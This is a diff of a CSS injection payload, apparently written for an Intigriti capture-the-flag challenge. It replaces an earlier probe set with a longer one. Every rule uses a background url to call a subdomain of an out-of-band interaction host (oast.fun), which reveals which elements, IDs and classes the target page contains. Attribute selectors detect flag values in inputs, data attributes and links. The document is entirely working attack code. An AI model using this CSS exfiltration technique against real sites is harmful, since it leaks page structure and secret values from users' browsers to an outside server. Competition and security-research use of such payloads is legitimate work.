@@ -1,19 +1,50 @@
-/* Test if any element has content containing INTIGRITI */
-body { background: url("http://csshit.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/body"); }
+/* Probe page structure */
+body { background: url("http://css-body.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/"); }
+h1 { background: url("http://css-h1.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/"); }
+h2 { background: url("http://css-h2.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/"); }
+h3 { background: url("http://css-h3.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/"); }
+p { background: url("http://css-p.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/"); }
+div { background: url("http://css-div.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/"); }
+span { background: url("http://css-span.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/"); }
+a { background: url("http://css-a.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/"); }
+img { background: url("http://css-img.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/"); }
+ul { background: url("http://css-ul.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/"); }
+li { background: url("http://css-li.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/"); }
+table { background: url("http://css-table.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/"); }
+td { background: url("http://css-td.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/"); }
+tr { background: url("http://css-tr.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/"); }
+th { background: url("http://css-th.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/"); }
+form { background: url("http://css-form.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/"); }
+input { background: url("http://css-input.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/"); }
+button { background: url("http://css-button.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/"); }
+textarea { background: url("http://css-textarea.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/"); }
+pre { background: url("http://css-pre.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/"); }
+code { background: url("http://css-code.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/"); }
+script { display:block; background: url("http://css-script.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/"); }
+style { display:block; background: url("http://css-style.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/"); }
+iframe { background: url("http://css-iframe.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/"); }
+video { background: url("http://css-video.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/"); }
+section { background: url("http://css-section.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/"); }
+header { background: url("http://css-header.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/"); }
+nav { background: url("http://css-nav.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/"); }
+main { background: url("http://css-main.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/"); }
 
-/* Try to detect flag in input/textarea values */
-input[value*="INTIGRITI"] { background: url("http://flag-input.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/"); }
-textarea[value*="INTIGRITI"] { background: url("http://flag-textarea.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/"); }
-*[data-flag] { background: url("http://dataflag.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/"); }
-*[flag] { background: url("http://flagattr.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/"); }
+/* Check for IDs */
+#flag { background: url("http://css-id-flag.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/") !important; }
+#content { background: url("http://css-id-content.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/") !important; }
+#app { background: url("http://css-id-app.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/") !important; }
+#report { background: url("http://css-id-report.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/") !important; }
+#reports { background: url("http://css-id-reports.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/") !important; }
+#channel { background: url("http://css-id-channel.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/") !important; }
+#admin { background: url("http://css-id-admin.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/") !important; }
+#tv { background: url("http://css-id-tv.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/") !important; }
 
-/* Detect various page elements */
-#flag { background: url("http://idflag.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/"); }
-.flag { background: url("http://classflag.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/"); }
-pre { background: url("http://pre.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/"); }
-code { background: url("http://code.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/"); }
-table { background: url("http://table.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/"); }
-form { background: url("http://form.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/"); }
-iframe { background: url("http://iframe-el.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/"); }
-h1 { background: url("http://h1.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/"); }
-h2 { background: url("http://h2.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/"); }
+/* Check for classes */
+.flag { background: url("http://css-cl-flag.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/") !important; }
+.report { background: url("http://css-cl-report.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/") !important; }
+.channel { background: url("http://css-cl-channel.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/") !important; }
+
+/* Check for attributes containing flag */
+*[value*="INTIGRITI"] { background: url("http://css-val-flag.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/") !important; }
+*[data-flag] { background: url("http://css-dataflag.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/") !important; }
+*[href*="flag"] { background: url("http://css-hrefflag.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/") !important; }
